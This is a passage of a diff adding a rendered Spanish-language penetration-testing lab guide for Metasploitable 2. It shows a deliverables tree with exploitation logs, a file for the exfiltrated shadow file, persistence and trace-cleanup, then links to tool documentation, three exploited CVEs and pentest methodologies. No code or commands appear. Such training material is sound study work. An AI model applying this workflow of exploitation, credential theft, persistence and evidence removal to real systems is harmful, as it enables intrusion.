+<span id="cb43-944"><a href="#cb43-944" aria-hidden="true" tabindex="-1"></a><span class="in">├── enumeracion/</span></span>
+<span id="cb43-945"><a href="#cb43-945" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── fase2_nikto.txt</span></span>
+<span id="cb43-946"><a href="#cb43-946" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── fase2_dirb.txt</span></span>
+<span id="cb43-947"><a href="#cb43-947" aria-hidden="true" tabindex="-1"></a><span class="in">│   └── fase2_mysql.txt</span></span>
+<span id="cb43-948"><a href="#cb43-948" aria-hidden="true" tabindex="-1"></a><span class="in">├── explotacion/</span></span>
+<span id="cb43-949"><a href="#cb43-949" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── vector1_vsftpd.log</span></span>
+<span id="cb43-950"><a href="#cb43-950" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── vector2_samba.log</span></span>
+<span id="cb43-951"><a href="#cb43-951" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── vector3_irc.log</span></span>
+<span id="cb43-952"><a href="#cb43-952" aria-hidden="true" tabindex="-1"></a><span class="in">│   └── vector4_sqli.log    (bonus)</span></span>
+<span id="cb43-953"><a href="#cb43-953" aria-hidden="true" tabindex="-1"></a><span class="in">├── post_explotacion/</span></span>
+<span id="cb43-954"><a href="#cb43-954" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── shadow_exfiltrado.txt</span></span>
+<span id="cb43-955"><a href="#cb43-955" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── persistencia.log</span></span>
+<span id="cb43-956"><a href="#cb43-956" aria-hidden="true" tabindex="-1"></a><span class="in">│   └── limpieza_huellas.md</span></span>
+<span id="cb43-957"><a href="#cb43-957" aria-hidden="true" tabindex="-1"></a><span class="in">├── evidencias/</span></span>
+<span id="cb43-958"><a href="#cb43-958" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── screenshot_01_nmap_puertos.png</span></span>
+<span id="cb43-959"><a href="#cb43-959" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── screenshot_02_vector1_root.png</span></span>
+<span id="cb43-960"><a href="#cb43-960" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── screenshot_03_vector2_samba.png</span></span>
+<span id="cb43-961"><a href="#cb43-961" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── screenshot_04_vector3_irc.png</span></span>
+<span id="cb43-962"><a href="#cb43-962" aria-hidden="true" tabindex="-1"></a><span class="in">│   ├── screenshot_05_shadow.png</span></span>
+<span id="cb43-963"><a href="#cb43-963" aria-hidden="true" tabindex="-1"></a><span class="in">│   └── screenshot_06_persistencia.png</span></span>
+<span id="cb43-964"><a href="#cb43-964" aria-hidden="true" tabindex="-1"></a><span class="in">└── reporte/</span></span>
+<span id="cb43-965"><a href="#cb43-965" aria-hidden="true" tabindex="-1"></a><span class="in">    ├── reporte_ejecutivo.pdf</span></span>
+<span id="cb43-966"><a href="#cb43-966" aria-hidden="true" tabindex="-1"></a><span class="in">    └── reporte_tecnico.md</span></span>
+<span id="cb43-967"><a href="#cb43-967" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-968"><a href="#cb43-968" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-969"><a href="#cb43-969" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb43-970"><a href="#cb43-970" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-971"><a href="#cb43-971" aria-hidden="true" tabindex="-1"></a><span class="fu">## Recursos</span></span>
+<span id="cb43-972"><a href="#cb43-972" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-973"><a href="#cb43-973" aria-hidden="true" tabindex="-1"></a><span class="fu">### Documentación de Herramientas</span></span>
+<span id="cb43-974"><a href="#cb43-974" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">Metasploit Framework Docs</span><span class="co">](https://docs.rapid7.com/metasploit/)</span></span>
+<span id="cb43-975"><a href="#cb43-975" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">Nmap Book</span><span class="co">](https://nmap.org/book/man.html)</span></span>
+<span id="cb43-976"><a href="#cb43-976" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">OWASP Testing Guide v4.2</span><span class="co">](https://owasp.org/www-project-web-security-testing-guide/)</span></span>
+<span id="cb43-977"><a href="#cb43-977" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">sqlmap Wiki</span><span class="co">](https://github.com/sqlmapproject/sqlmap/wiki)</span></span>
+<span id="cb43-978"><a href="#cb43-978" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-979"><a href="#cb43-979" aria-hidden="true" tabindex="-1"></a><span class="fu">### CVEs Explotados en este Lab</span></span>
+<span id="cb43-980"><a href="#cb43-980" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">CVE-2011-2523</span><span class="co">](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)</span> — vsftpd 2.3.4 Backdoor</span>
+<span id="cb43-981"><a href="#cb43-981" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">CVE-2007-2447</span><span class="co">](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)</span> — Samba Username Map Script</span>
+<span id="cb43-982"><a href="#cb43-982" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">CVE-2010-2075</span><span class="co">](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)</span> — UnrealIRCd 3.2.8.1 Backdoor</span>
+<span id="cb43-983"><a href="#cb43-983" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-984"><a href="#cb43-984" aria-hidden="true" tabindex="-1"></a><span class="fu">### Metasploitable 2</span></span>
+<span id="cb43-985"><a href="#cb43-985" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">Metasploitable 2 Download (SourceForge)</span><span class="co">](https://sourceforge.net/projects/metasploitable/)</span></span>
+<span id="cb43-986"><a href="#cb43-986" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">Metasploitable 2 Exploitability Guide — Rapid7</span><span class="co">](https://community.rapid7.com/docs/DOC-1875)</span></span>
+<span id="cb43-987"><a href="#cb43-987" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">VulnHub — Metasploitable 2 Walkthrough Reference</span><span class="co">](https://www.vulnhub.com/entry/metasploitable-2,29/)</span></span>
+<span id="cb43-988"><a href="#cb43-988" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-989"><a href="#cb43-989" aria-hidden="true" tabindex="-1"></a><span class="fu">### Metodologías de Pentest</span></span>
+<span id="cb43-990"><a href="#cb43-990" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">PTES — Penetration Testing Execution Standard</span><span class="co">](http://www.pentest-standard.org/)</span></span>
+<span id="cb43-991"><a href="#cb43-991" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">OWASP Web Security Testing Guide</span><span class="co">](https://owasp.org/www-project-web-security-testing-guide/)</span></span>
+<span id="cb43-992"><a href="#cb43-992" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">NIST SP 800-115 — Technical Guide to Information Security Testing</span><span class="co">](https://csrc.nist.gov/publications/detail/sp/800-115/final)</span></span>
+<span id="cb43-993"><a href="#cb43-993" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-994"><a href="#cb43-994" aria-hidden="true" tabindex="-1"></a><span class="fu">### Recursos de Aprendizaje Adicional</span></span>
+<span id="cb43-995"><a href="#cb43-995" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">Hack The Box</span><span class="co">](https://www.hackthebox.com/)</span> — Plataforma de práctica</span>
+<span id="cb43-996"><a href="#cb43-996" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">TryHackMe — Metasploit Room</span><span class="co">](https://tryhackme.com/room/metasploitintro)</span></span>
+<span id="cb43-997"><a href="#cb43-997" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span><span class="co">[</span><span class="ot">OffSec PEN-103 (Kali Linux Revealed)</span><span class="co">](https://www.kali.org/docs/)</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button" data-in-quarto-modal=""><i class="bi"></i></button></div>
+</div></div></div></div></div>
 </div> <!-- /content -->
 
 
